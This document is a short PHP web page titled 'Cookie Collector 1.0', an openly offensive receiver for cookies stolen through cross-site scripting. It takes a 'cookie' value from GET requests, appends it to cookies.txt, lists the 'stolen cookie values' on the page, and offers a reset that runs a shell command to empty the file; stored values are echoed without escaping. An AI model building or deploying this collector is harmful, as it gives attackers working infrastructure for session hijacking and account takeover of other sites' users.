<!DOCTYPE HTML>
<html>
<head>
<link rel="shortcut icon" href="mat.ico">
<title>Cookie Collector</title>
</head>
<body bgcolor="#000000" text="#00FF00">
<h1>Cookie Collector 1.0</h1>
<p>Some sites have poor security and are vulnerable to XSS. Use this site to collect their users' cookies. 
<br/>See if you can send a user's cookie using a GET request to this page using the GET field called 'cookie'.</p>
<?php
if (isset($_GET['cookie']) && !isset($_POST['button'])) {
	file_put_contents("cookies.txt", trim($_GET["cookie"]), FILE_APPEND);
} 
if (isset($_POST['button'])) {
      exec('cat /dev/null > cookies.txt');
      echo "Reset Complete!";
}
?>
<br>

</body>

<?php 
if (!isset($_POST['button'])) {
	echo "<b>List of stolen cookie values:</b><br/>\n";
	$lines = file("cookies.txt");
	foreach ($lines as $line_num => $line) {
	  echo "#<b>{$line_num}</b> : " . $line . "<br />\n";
	}
	echo "<br/>";
}
?>

<form method="post">
    <p>
        <button name="button">Reset</button>
    </p>
</form>
<br>

<p style="font-size:10px"><a href="https://www.keaneokelley.com">Keane was here.</a></p>


</html>
